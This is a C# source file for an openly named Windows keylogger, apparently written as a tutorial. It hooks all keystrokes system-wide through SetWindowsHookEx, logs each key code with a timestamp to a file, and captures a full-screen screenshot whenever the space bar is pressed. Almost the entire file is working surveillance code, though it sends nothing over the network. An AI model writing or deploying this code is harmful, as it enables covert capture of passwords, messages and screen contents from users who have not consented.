using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

class KeyLogger
{
    // Program entry point. The program starts here.
    public static void Main()
    {
        // Create a logger to log key codes.
        logger = new System.IO.StreamWriter("KeyLogger.log", true);

        // Make logger writing data to file automatically after each .WriteLine() call.
        logger.AutoFlush = true;

        // Get a name of a executable module
        String mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;

        // Set up a keypress event listener. Each time HookCallback() method will be called.
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(mainModuleName), 0);

        // Run the application.
        Application.Run();
        
        // Unsubscribe from keypress event.
        UnhookWindowsHookEx(keyboardHook);
        
        // Close logger file.
        logger.Close();
    }
    
    // This method is called each time when a key is pressed.
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            // Get a code of the last pressed key.
            int vkCode = Marshal.ReadInt32(lParam);

            // Log current time and key code to a file.
            logger.WriteLine("{0},{1}", DateTime.Now.ToString("MM/dd/yyyy h:mm:ss"), vkCode);

            // Also write a key on console.
            Console.WriteLine("{0} pressed", (Keys)vkCode);

            // Check if the last pressed key is a special key. Special key is defined below.
            if ((Keys)vkCode == screenshotKey)
            {
                // Do some worst thing.
                TakeScreenshot();
            }
        }

        // May be another listeners of a key press event. Call them too.
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }

    // This method is called when a special key is pressed.
    private static void TakeScreenshot()
    {
        // Create a bitmap (some kind of matrix, it holds color info in the cells) with size as our screen.
        using (System.Drawing.Bitmap bitmap = new System.Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
        {
            // Create drawing context.
            using (System.Drawing.Graphics graphics = System.Drawing.Graphics.FromImage(bitmap))
            {
                // Copy screen color info into the bitmap using drawing context.
                graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                    Screen.PrimaryScreen.Bounds.Y,
                    0, 0,
                    bitmap.Size,
                    System.Drawing.CopyPixelOperation.SourceCopy);
            }

            // Put the bitmap into the specified directory.
            // But what if such a file exists in the directory?
            // The name of the picture depending on the current time should do the trick.
            bitmap.Save(String.Format("Screenshots\\picture-{0}.bmp", DateTime.Now.ToString("MM_dd_yyyy-h_mm_ss")));
        }
    }

    // Our hook handler. It's like a poiter, so we can manipulate it later.
    private static IntPtr keyboardHook = IntPtr.Zero;

    // We define an event category we're interested in.
    // In that case we'd like the keyboard event type.
    private const int WH_KEYBOARD_LL = 13;

    // Also define a type of an action that user produce with keys.
    // We need the only key down action (not key up).
    private const int WM_KEYDOWN = 0x0100;

    // Define a special key.
    // Pressing that key will take a screenshot.
    private static Keys screenshotKey = Keys.Space;

    // Our logger instance.
    private static System.IO.StreamWriter logger;

    // A delegate in C# is similar to a function pointer in C, C++.
    private delegate IntPtr LowLevelProcedure(int nCode, IntPtr wParam, IntPtr lParam);

    // Load some useful methods from Windows libraries.

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProcedure lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
